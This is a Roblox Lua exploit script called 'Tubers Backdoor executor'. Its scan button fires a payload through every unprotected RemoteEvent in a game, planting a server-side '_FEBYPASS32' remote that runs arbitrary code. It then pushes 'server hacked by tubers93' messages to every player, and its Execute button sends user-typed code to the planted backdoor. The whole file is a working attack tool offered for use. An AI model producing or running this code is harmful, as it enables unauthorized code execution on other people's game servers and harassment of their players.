local plr = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
gui.Name = ""
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Name = "Frame"
frame.Size = UDim2.new(0, 490, 0, 270)
frame.Position = UDim2.new(0.3, 0, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = false

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "Tubers Backdoor executor"
title.TextColor3 = Color3.fromRGB(125, 71, 0)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 20

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(1, -10, 0, 190)
box.Position = UDim2.new(0, 5, 0, 40)
box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
box.TextColor3 = Color3.fromRGB(255, 255, 255)
box.Font = Enum.Font.Code
box.TextSize = 16
box.ClearTextOnFocus = false
box.MultiLine = true
box.TextWrapped = true
box.TextXAlignment = Enum.TextXAlignment.Left
box.TextYAlignment = Enum.TextYAlignment.Top
box.Text = "www.youtube.com/@c00lkidd_Trolling"

local exec = Instance.new("TextButton", frame)
exec.Size = UDim2.new(0.48, 0, 0, 30)
exec.Position = UDim2.new(0.01, 0, 1, -35)
exec.BackgroundColor3 = Color3.fromRGB(79, 45, 1)
exec.Text = "Execute"
exec.TextColor3 = Color3.new(1, 1, 1)
exec.Font = Enum.Font.SourceSansBold
exec.TextSize = 16

local clear = Instance.new("TextButton", frame)
clear.Size = UDim2.new(0.48, 0, 0, 30)
clear.Position = UDim2.new(0.51, 0, 1, -35)
clear.BackgroundColor3 = Color3.fromRGB(125, 71, 0)
clear.Text = "Clear"
clear.TextColor3 = Color3.new(1, 1, 1)
clear.Font = Enum.Font.SourceSansBold
clear.TextSize = 16

local scanner = Instance.new("TextButton", frame)
scanner.Size = UDim2.new(0, 95, 0, 30)
scanner.Position = UDim2.new(0, 5, 1, -266)
scanner.BackgroundColor3 = Color3.fromRGB(125, 71, 0)
scanner.Text = "scan Backdoor"
scanner.TextColor3 = Color3.fromRGB(255, 255, 255)
scanner.Font = Enum.Font.GothamBold
scanner.TextSize = 13

local closeBtn = Instance.new("TextButton", frame)
closeBtn.Size = UDim2.new(0, 40, 0, 30)
closeBtn.Position = UDim2.new(0, 445, 1, -266)
closeBtn.BackgroundColor3 = Color3.fromRGB(79, 45, 1)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 17

closeBtn.MouseButton1Click:Connect(function()
	frame:Destroy()
end)







local picture = Instance.new("ImageLabel", frame)
picture.Size = UDim2.new(0, 165, 0, 140) 
picture.Position = UDim2.new(0, 175, -0.51, 0) 
picture.BackgroundTransparency = 1 
picture.Image = "rbxassetid://114269050505836" 


local minimizeBtn = Instance.new("TextButton", frame)
minimizeBtn.Size = UDim2.new(0, 40, 0, 30)
minimizeBtn.Position = UDim2.new(0, 405, 1, -266)
minimizeBtn.BackgroundColor3 = Color3.fromRGB(79, 45, 1)
minimizeBtn.Text = "-"
minimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.TextSize = 17

minimizeBtn.MouseButton1Click:Connect(function()
	frame.Visible = false
	local openBtn = Instance.new("TextButton", gui)
	openBtn.Size = UDim2.new(0, 92, 0, 25)
	openBtn.Position = UDim2.new(0, 170, 0, -35)
	openBtn.BackgroundColor3 = Color3.fromRGB(125, 71, 0)
	openBtn.Text = "Open executor"
	openBtn.TextColor3 = Color3.new(1, 1, 1)
	openBtn.Font = Enum.Font.GothamBold
	openBtn.TextSize = 14

	openBtn.MouseButton1Click:Connect(function()
		frame.Visible = true
		openBtn:Destroy()
	end)
end)

exec.MouseButton1Click:Connect(function()
	local source = box.Text
	local feRemote = game:GetService("JointsService"):FindFirstChild("_FEBYPASS32")

	if feRemote then
		feRemote:FireServer([[ 
			local user_code = ]] .. string.format("%q", source) .. [[
			local loadsuccess, loadfunc = pcall(loadstring, user_code)
			if loadsuccess and loadfunc then
				pcall(loadfunc)
			end
		]])
	else
		local fn, err = loadstring(source)
		if fn then
			pcall(fn)
		end
	end
end)

clear.MouseButton1Click:Connect(function()
	box.Text = ""
end)

scanner.MouseButton1Click:Connect(function()
	local function b_G_V12(see)
		local a = function(ree)
			ree:FireServer([[ 
				local folder = Instance.new('RemoteEvent')
				folder.Name = "_FEBYPASS32"
				folder.Parent = game:GetService("JointsService")
				local loadstring = require(13684410229)
				folder.OnServerEvent:Connect(function(_1,_2)
					loadstring(_2)()
				end)
			]])
		end
		for i, v in pairs(see:GetChildren()) do
			if v:IsA("RemoteEvent") then
				if not string.match(string.lower(v.Name), "ban") and not string.match(string.lower(v.Name), "kick") then
					a(v)
				end
			end
			b_G_V12(v)
		end
	end

	scanner.Text = "scanning."
	wait(0.5)
	scanner.Text = "scanning.."
	wait(0.5)
	scanner.Text = "scanning..."
	wait(0.5)
	scanner.Text = "scanning."
	wait(0.5)
	scanner.Text = "scanning.."
	wait(0.5)
	scanner.Text = "scanning..."
	wait(0.5)
	scanner.Text = "no Backdoor"

	b_G_V12(game:GetService("ReplicatedStorage"))

	local timetoken = 0
	local maxtime = 5
	repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime

	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
		scanner.Text = "Found😎"

		local feRemote = game:GetService("JointsService"):FindFirstChild("_FEBYPASS32")
		if feRemote then
			feRemote:FireServer([[ 
				local hint = Instance.new("Hint")
				hint.Text = "Tubers93 Hack the server"
				hint.Parent = game.Workspace
				task.delay(30, function() hint:Destroy() end)
			]])

			feRemote:FireServer([[ 
				for _, player in ipairs(game.Players:GetPlayers()) do
					local gui = Instance.new("ScreenGui")
					gui.Name = "HelloMenu"
					gui.ResetOnSpawn = false
					gui.Parent = player:WaitForChild("PlayerGui")

					local frame = Instance.new("Frame", gui)
					frame.Size = UDim2.new(0, 500, 0, 150)
					frame.Position = UDim2.new(0.5, -165, 0.5, -75)
					frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
					frame.Active = true
					frame.Draggable = true

					local label = Instance.new("TextLabel", frame)
					label.Size = UDim2.new(1, 0, 0.6, 0)
					label.Position = UDim2.new(0, 0, 0, 0)
					label.Text = "Warning!!!! This server was hacked by tubers93"
					label.TextColor3 = Color3.new(1, 1, 1)
					label.Font = Enum.Font.Gotham
					label.TextSize = 20
					label.BackgroundTransparency = 1

					local button = Instance.new("TextButton", frame)
					button.Size = UDim2.new(0.5, 0, 0.3, 0)
					button.Position = UDim2.new(0.25, 0, 0.65, 0)
					button.Text = "OK"
					button.BackgroundColor3 = Color3.fromRGB(125, 71, 0)
					button.TextColor3 = Color3.new(1, 1, 1)
					button.Font = Enum.Font.GothamBold
					button.TextSize = 18

					button.MouseButton1Click:Connect(function()
						gui:Destroy()
					end)
				end
			]])
		end

		
	end
end)




local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local dragging = false
local dragInput, mousePos, framePos
local targetPos = frame.Position
local smoothSpeed = 0.1

UIS.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:GetFocusedTextBox() == nil then
		local mouse = input.Position
		if frame.AbsolutePosition.X <= mouse.X and mouse.X <= frame.AbsolutePosition.X + frame.AbsoluteSize.X and
		   frame.AbsolutePosition.Y <= mouse.Y and mouse.Y <= frame.AbsolutePosition.Y + frame.AbsoluteSize.Y then
			dragging = true
			mousePos = input.Position
			framePos = frame.Position
			targetPos = frame.Position
		end
	end
end)

UIS.InputChanged:Connect(function(input)
	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UIS.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = false
	end
end)

RunService.RenderStepped:Connect(function()
	if dragging and dragInput then
		local delta = dragInput.Position - mousePos
		targetPos = UDim2.new(
			framePos.X.Scale, framePos.X.Offset + delta.X,
			framePos.Y.Scale, framePos.Y.Offset + delta.Y
		)
	end
	frame.Position = frame.Position:Lerp(targetPos, smoothSpeed)
end)
